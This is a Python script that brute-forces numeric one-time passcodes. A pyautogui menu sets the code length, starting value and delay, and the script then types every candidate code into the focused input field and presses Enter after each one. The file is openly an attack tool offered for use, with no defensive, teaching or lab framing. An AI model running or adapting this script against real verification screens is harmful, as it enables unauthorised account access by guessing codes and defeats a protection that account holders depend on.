#!/usr/bin/python

import time
import pyautogui
import sys

# Default settings
otp_length = 4
start_range = 1001
speed = 1.0

def display_menu():
    options = """
    1. Start brute force
    2. Set OTP length (current: {})
    3. Set starting range (current: {})
    4. Set entry speed (current: {} seconds)
    5. Exit
    """.format(otp_length, start_range, speed)
    
    choice = pyautogui.prompt(text=options, title='Launcher Menu')
    
    if not choice.isdigit():
        pyautogui.alert('Invalid choice! Please enter a number between 1 and 5.')
        return display_menu()
    
    return int(choice)

def set_otp_length():
    global otp_length
    length = pyautogui.prompt(text='Enter OTP length (4 or 6):', title='OTP Length', default=str(otp_length))
    if length not in ['4', '6']:
        pyautogui.alert('Invalid OTP length! Please enter 4 or 6.')
    else:
        otp_length = int(length)

def set_starting_range():
    global start_range
    start_range_input = pyautogui.prompt(text='Enter starting range for OTP (e.g., 1001):', title='Starting Range', default=str(start_range))
    if not start_range_input.isdigit():
        pyautogui.alert('Invalid starting range! Please enter a numeric value.')
    else:
        start_range = int(start_range_input)

def set_speed():
    global speed
    speed_input = pyautogui.prompt(text='Enter delay between attempts in seconds (e.g., 0.5 for faster, 1 for normal):', title='Entry Speed', default=str(speed))
    try:
        speed = float(speed_input)
        if speed < 0:
            raise ValueError
    except ValueError:
        pyautogui.alert('Invalid speed! Please enter a positive number.')

def brute_force_otp():
    time.sleep(5)
    
    max_value = 10**otp_length - 1  # e.g., 9999 for 4-digit, 999999 for 6-digit
    
    for otp in range(start_range, max_value + 1):
        otp_str = str(otp).zfill(otp_length)  # Ensure the OTP has the correct length (e.g., 0001, 0023)
        
        pyautogui.hotkey('ctrl', 'a')
        pyautogui.typewrite(otp_str)
        pyautogui.press('enter')
        print(f"Trying OTP: {otp_str}")

        time.sleep(speed)  # Delay between attempts based on user input

def main():
    while True:
        choice = display_menu()
        
        if choice == 1:
            brute_force_otp()
        elif choice == 2:
            set_otp_length()
        elif choice == 3:
            set_starting_range()
        elif choice == 4:
            set_speed()
        elif choice == 5:
            sys.exit()
        else:
            pyautogui.alert('Invalid option! Please select a valid option.')

if __name__ == "__main__":
    main()
